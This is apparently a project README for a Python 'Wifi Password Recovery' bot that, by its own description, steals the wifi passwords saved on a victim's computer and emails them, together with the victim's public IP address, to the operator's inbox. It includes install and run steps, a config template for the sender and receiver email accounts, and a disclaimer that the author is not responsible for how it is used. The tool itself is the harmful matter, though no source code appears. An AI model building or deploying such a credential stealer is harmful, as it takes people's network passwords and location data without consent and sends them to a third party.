# Wifi Password Recovery
A bot made in **Python** to steal saved wifi passwords in a computer and then report them through email.

# Features
* Gives the public ip of the victim when reporting
* Send reports through email for all wifi passwords in a nice format

# Setup
* pip install -r requirements.txt - Install all packages
* Input your details in config.json
* Run password-stealer.py

# Requirement
**[Python](https://www.python.org/)** --> 3.7 or more 

# Configuration

```json
{
  "from_email": "YOUR EMAIL USED FOR SENDING REPORTS - FOR GMAIL, BE SURE LESS SECURE APP IS ENABLED --> https://devanswers.co/allow-less-secure-apps-access-gmail-account/",
  "from_email_password": "YOUR EMAIL USED FOR SENDING REPORTS - PASSWORD",
  "to_email": "THE EMAIL TO RECEIVE THE REPORTS"
}
```

# Notes
I'm **not responsible** for whatever actions you did when you are using this program.

# Made By
**Snavellet** --> Primary Developer

# License
MIT